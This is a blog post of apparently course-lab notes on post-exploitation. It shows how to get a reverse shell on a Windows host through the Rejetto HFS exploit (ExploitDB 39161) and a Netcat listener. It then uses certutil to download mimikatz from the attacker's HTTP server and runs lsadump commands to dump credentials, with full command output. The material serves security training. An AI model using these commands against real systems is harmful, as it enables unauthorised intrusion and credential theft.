---
layout: post
title: "Transferring Files To Windows Targets"
date: "2023-06-22"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Transferring Files To Windows Targets（将文件传输到 Windows 目标）
# Demo: Transferring Files To Windows Targets（演示：将文件传输到 Windows 目标）
We will be exploring the process of how to transfer files to a Windows target that you have just compromised, in the event that you do not have access to a meterpreter session. And this is going to work in conjunction with the web server that we set up with Python.

The way this is going to work is we'll firstly need to gain access to the target system. And we're not going to be utilizing a Metasploit Framework exploit module to gain access. We're going to be utilizing a piece of exploit code from ExploitDB. We're going to run it, and once we gain access and obtain a standard command shell session, we're then going to transfer a useful post-exploitation executable that we probably want to use on the target system. And we'll take a look at how this can be facilitated with the simple HTTP web server that we can set up with Python as well as inbuilt utilities on Windows that can be used to download a file that is hosted on a web server.

Target IP Address : 10.2.30.185

We need to identify what vulnerable service is running on the Windows target.

`-sV`: We're performing a service version detection scan on port 80.

```
nmap -sV -p 80 10.2.30.185
```

We will be exploring how to exploit it with an exploit on ExploitDB.

```
searchsploit rejetto
pwd
searchsploit -m 39161
ls -al
```

Kali Linux : 10.10.5.2

[Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](https://www.exploit-db.com/exploits/39161)

```python
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!

	ip_addr = "10.10.5.2" #local IP address
	local_port = "1234" # Local Port number
```

Tab1 : We're going to be running the Python exploit.

Tab2 : We're going to set up our Netcat listener.

```
nc -nvlp 1234
```

Tab3 : We need to host the Netcat executable.

```
cd /usr/share/windows-binaries
ls
python3 -m http.server 80
```

Tab1 : This exploit doesn't work on its first try.

```
python 39161.py 10.2.30.185 80
```

Tab3 : A GET request is made, which means that netcat.exe was downloaded.

Tab2 : our Netcat listener, we didn't receive a command shell session.

Tab1 : We need to run the exploit again.

```
python3 39161.py 10.2.30.185 80
```

Tab2 : our Netcat listener, we have exploited the target system. And we are provided with a simple command shell session on the target system.

We can perform some local enumeration to identify who we are exactly.

```
C:\hfs>whoami
```

We are currently the administrator user. In this case, we do not need to elevate our privileges.

```
C:\hfs>whoami /priv
```

To display the list of privileges associated with this account.

This is where the whole file transfer process comes into play.

Remember, we don't have a meterpreter session. This is a simple command shell session.

We wanted to transfer mimikatz.exe. Mimikatz.exe is a post-exploitation tool that is used to dump Windows hashes and passwords that are stored in memory.

Tab3 : 

```
cd /usr/share/windows-resources/mimikatz/x64/
ls
```

How would I transfer this file onto the Windows target system?

Tab2 : Whenever you're transferring a file to a target system, always do it within the Temp directory.

```
C:\hfs>cd C:\\
C:\>dir
C:\>mkdir Temp
C:\>cd Temp
C:\Temp>
```

Tab 3 : 

```
python3 -m http.server 80
```

Tab 2 : How do we download it? The best utility that comes pre-packaged on pretty much all versions of Windows is the `certutil` utility.

The `certutil` utility is used for a wide range of functionality. However, one of the cool features that it provides to users is the ability download a file from a web server.

Make sure you're in the directory where you want to download the file.

`-f`: Specify that you want to download a file.

You then need to specify what you want to call the file after it's downloaded. Because, on Windows, you need to specify a file name for the file that you're downloading.

```
C:\Temp>certutil -urlcache -f http://10.10.5.2/mimikatz.exe mimikatz.exe
```

We've successfully transferred the mimikatz executable from our Kali Linux system onto the target system.

```
C:\Temp>dir
```

```
C:\Temp>.\mimikatz.exe
```

I can then check whether I have the necessary permissions to execute it or to use it.

```
mimikatz # privilege::debug
```

If I want to dump the contents of the LSASS process, or the LSASS cache from the memory. 

```
mimikatz # lsadump::sam
```

To dump the data that's stored within the cache pertinent to the SAM database on Windows.

```
mimikatz # exit
```

Tab3 : 

```
cd /root
vim test.txt
This is some test data
python3 -m http.server 80
```

Tab2 :

```
C:\Temp>certutil -urlcache -f http://10.10.5.2/test.txt test.txt
```

```
C:\Temp>dir
C:\Temp>type test.txt
```

That is how to transfer a series of file from your Kali Linux system onto a Windows target that you have compromised.

# Transferring Files To Windows Targets
## Overview
Goal

This lab covers the process of transferring files to Windows targets by leveraging a web server running on the Kali linux system.

# 将文件传输到 Windows 目标
## 概述
目标

本实验介绍了利用 Kali Linux 系统上运行的 Web 服务器将文件传输到 Windows 目标的过程。

## 复现视频内容
Target IP Address : 10.0.25.234

Kali Linux : 10.10.21.3

```
root@attackdefense:~# nmap -sV -p 80 10.0.25.234
Starting Nmap 7.70 ( https://nmap.org ) at 2023-06-22 06:45 IST
Nmap scan report for 10.0.25.234
Host is up (0.0030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```

```
root@attackdefense:~# searchsploit rejetto
--------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                           |  Path
                                                                                                         | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------- ----------------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                   | exploits/windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                        | exploits/windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                           | exploits/multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                      | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                      | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                 | exploits/windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
root@attackdefense:~# pwd
/root
root@attackdefense:~# searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/39161.py


root@attackdefense:~# ls
39161.py  Desktop  thinclient_drives
```

Tab1 : exploit

Tab2 : Netcat listener

Tab3 : Host Netcat executable

Tab2

```
root@attackdefense:~# nc -nvlp 1234 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

Tab3

```
root@attackdefense:~# cd /usr/share/windows-binaries
root@attackdefense:/usr/share/windows-binaries# ls
enumplus  exe2bat.exe  fgdump  fport  klogger.exe  mbenum  nbtenum  nc.exe  plink.exe  radmin.exe  vncviewer.exe  wget.exe  whoami.exe
root@attackdefense:/usr/share/windows-binaries# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

```python
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!

	ip_addr = "10.10.21.3" #local IP address
	local_port = "1234" # Local Port number
```

Tab1

```
root@attackdefense:~# python 39161.py 10.0.25.234 80
```

Tab3

```
root@attackdefense:/usr/share/windows-binaries# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.25.234 - - [22/Jun/2023 06:57:59] "GET /nc.exe HTTP/1.1" 200 -
10.0.25.234 - - [22/Jun/2023 06:57:59] "GET /nc.exe HTTP/1.1" 200 -
10.0.25.234 - - [22/Jun/2023 06:57:59] "GET /nc.exe HTTP/1.1" 200 -
10.0.25.234 - - [22/Jun/2023 06:57:59] "GET /nc.exe HTTP/1.1" 200 -

```

Tab2

```
root@attackdefense:~# nc -nvlp 1234 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

Tab1

```
root@attackdefense:~# python 39161.py 10.0.25.234 80
```

Tab2

```
root@attackdefense:~# nc -nvlp 1234 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.25.234.
Ncat: Connection from 10.0.25.234:49516.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\hfs>
```

Tab2

```
C:\hfs>whoami
whoami
win-omcnbkr66mn\administrator
C:\hfs>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

```

Tab3

```
root@attackdefense:/usr/share/windows-binaries# cd /usr/share/windows-resources/mimikatz/x64/
root@attackdefense:/usr/share/windows-resources/mimikatz/x64# ls
mimidrv.sys  mimikatz.exe  mimilib.dll
root@attackdefense:/usr/share/windows-resources/mimikatz/x64# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Tab2

```
C:\hfs>cd c:\\
cd c:\\

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of c:\

09/14/2020  06:52 AM                32 flag.txt
06/22/2023  01:11 AM    <DIR>          hfs
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/05/2020  09:05 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
09/14/2020  06:49 AM    <DIR>          Windows
               1 File(s)             32 bytes
               6 Dir(s)   9,316,237,312 bytes free

c:\>mkdir Temp
mkdir Temp

c:\>cd temp         
cd temp

c:\Temp>

```

Tab2

```
c:\Temp>certutil -urlcache -f http://10.10.21.3/mimikatz.exe mimikatz.exe
certutil -urlcache -f http://10.10.21.3/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Tab3

```
root@attackdefense:/usr/share/windows-resources/mimikatz/x64# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.25.234 - - [22/Jun/2023 07:13:18] "GET /mimikatz.exe HTTP/1.1" 200 -
10.0.25.234 - - [22/Jun/2023 07:13:18] "GET /mimikatz.exe HTTP/1.1" 200 -

```

Tab2

```
c:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of c:\Temp

06/22/2023  01:43 AM    <DIR>          .
06/22/2023  01:43 AM    <DIR>          ..
06/22/2023  01:43 AM         1,240,840 mimikatz.exe
               1 File(s)      1,240,840 bytes
               2 Dir(s)   9,312,514,048 bytes free
c:\Temp>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb  8 2020 12:26:49
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam
Domain : WIN-OMCNBKR66MN
SysKey : 23675d238b2d51b9bd6c6885a4fbe6cf
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # exit
Bye!
```

Tab3

```
root@attackdefense:/usr/share/windows-resources/mimikatz/x64# cd /root
root@attackdefense:~# echo "this is some test data" > test.txt
root@attackdefense:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Tab2

```
c:\Temp>certutil -urlcache -f http://10.10.21.3/test.txt test.txt
certutil -urlcache -f http://10.10.21.3/test.txt test.txt
****  Online  ****
CertUtil: -URLCache command completed successfully.

```

Tab3

```
root@attackdefense:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.25.234 - - [22/Jun/2023 07:19:48] "GET /test.txt HTTP/1.1" 200 -
10.0.25.234 - - [22/Jun/2023 07:19:48] "GET /test.txt HTTP/1.1" 200 -

```

Tab2

```
c:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of c:\Temp

06/22/2023  01:49 AM    <DIR>          .
06/22/2023  01:49 AM    <DIR>          ..
06/22/2023  01:43 AM         1,240,840 mimikatz.exe
06/22/2023  01:49 AM                23 test.txt
               2 File(s)      1,240,863 bytes
               2 Dir(s)   9,312,514,048 bytes free

c:\Temp>type test.txt
type test.txt
this is some test data
```